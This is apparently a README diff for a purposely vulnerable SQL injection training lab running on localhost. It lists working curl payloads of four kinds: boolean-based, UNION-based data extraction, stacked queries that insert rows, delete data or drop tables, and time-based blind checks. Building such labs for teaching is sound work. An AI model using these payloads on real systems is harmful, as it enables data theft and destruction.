@@ -101,33 +101,114 @@ All routes served from `http://localhost:5001`. Full interactive docs at `/api-d
 
 ## SQL Injection Exploit Examples
 
-### Via REST (curl)
+> **All four insecure routes use integer context** — values are interpolated
+> bare into SQL with no surrounding quotes. String-context payloads (`'` based)
+> do not work here. The injection break is `)` or a SQL keyword, not `'`.
+
+### Injection context reference
+
+| Route | Interpolated SQL fragment | Context |
+|-------|--------------------------|---------|
+| `GET /api/insecure-users/:userid` | `WHERE userid = ${userid}` | integer |
+| `GET /api/insecure-users/:userid/clothes` | `WHERE uc.userid = ${userid}` | integer |
+| `POST /api/insecure-users/clothes` | `VALUES (${userid}, ${clothid})` | integer |
+| `POST /api/insecure-users/remove-cloth` | `WHERE userid = ${userid} AND clothid = ${clothid}` | integer |
+
+---
+
+### 1 — Boolean-based (manipulate WHERE to widen result set)
 
 ```bash
-# Dump all users via GET parameter injection
-GET http://localhost:5001/users/1/clothes?userid=1; DELETE FROM user_clothes; --
+# GET /insecure-users/:userid  →  WHERE userid = 1 OR 1=1  →  returns ALL users
+curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1"
 
-# Drop table via POST body
-POST http://localhost:5001/users/1/clothes
-{ "clothid": "1; DROP TABLE user_clothes; --" }
+# GET /insecure-users/:userid/clothes  →  WHERE uc.userid = 1 OR 1=1  →  ALL clothes
+curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1/clothes"
+
+# POST remove-cloth  →  DELETE WHERE userid=1 AND clothid=1 OR 1=1  →  WIPES TABLE
+curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"1","clothid":"1 OR 1=1"}'
 ```
 
-### Via Frontend UI
+---
 
-Navigate to `http://localhost:3000` → insecure cloth input field, enter the payload and press **Add Cloth (Insecure REST)**:
+### 2 — UNION-based (extract data from other tables)
 
+`users` has 3 columns (userid INT, name TEXT, surname TEXT).
+`clothes` has 6 columns (clothid INT, description, color, brand, size, material).
+
+```bash
+# Dump version via /insecure-users  (3-col UNION, userid=0 ensures no real row)
+curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,version(),'x'--"
+
+# Dump all usernames via /insecure-users
+curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname%20FROM%20users--"
+
+# Dump users table via /insecure-users/:userid/clothes  (must match 6 cols)
+# Maps:  clothid←userid, description←name, color←surname, rest padded
+curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname,name,surname,'x'%20FROM%20users--/clothes"
+
+# Enumerate tables via information_schema
+curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,table_name,'x'%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--"
 ```
-9'); INSERT INTO users (name, surname) VALUES ('Alex3', 'Jones3'); --
-10'); INSERT INTO users (name, surname) VALUES ('Pat', 'Noah'); --
+
+---
+
+### 3 — Stacked queries (execute additional statements)
+
+`pool.query()` uses PostgreSQL simple-query protocol — multiple statements
+separated by `;` are all executed.
+
+```bash
+# POST /clothes  →  INSERT completes, then second statement runs
+# Inject a new user row
+curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
+  -H "Content-Type: application/json" \
+  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Hacked\',\'User\'); --"}'
+
+# Delete ALL clothing assignments in one shot
+curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"5","clothid":"9); DELETE FROM user_clothes; --"}'
+
+# Stacked via GET (URL-encoded semicolon %3B)
+# INSERT a user via the GET route
+curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Eve','Hacker')--"
+
+# Drop a table (destructive — restart stack to recover)
+curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"1","clothid":"1; DROP TABLE user_clothes; --"}'
 ```
 
-Verify the injection worked:
+---
+
+### 4 — Time-based blind (confirm injection without visible output)
+
+```bash
+# 3-second delay confirms code execution even with no data returned
+curl -g -w "\nTotal time: %{time_total}s\n" \
+  "http://localhost:5001/api/insecure-users/1%3B%20SELECT%20pg_sleep(3)--"
+
+# Via POST body (cleaner, no URL encoding needed)
+curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
+  -H "Content-Type: application/json" \
+  -d '{"userid":"1","clothid":"1; SELECT pg_sleep(3); --"}' \
+  -w "\nTotal time: %{time_total}s\n"
+```
+
+---
+
+### Verify injections in the database
 
 ```bash
 docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM users;"
+docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM user_clothes;"
 ```
 
-The injected rows will appear alongside the original 5 seed users.
+Injected rows appear alongside the 5 seed users.
+To reset to a clean state: `docker compose down -v && docker compose up -d`
 
 ---
 
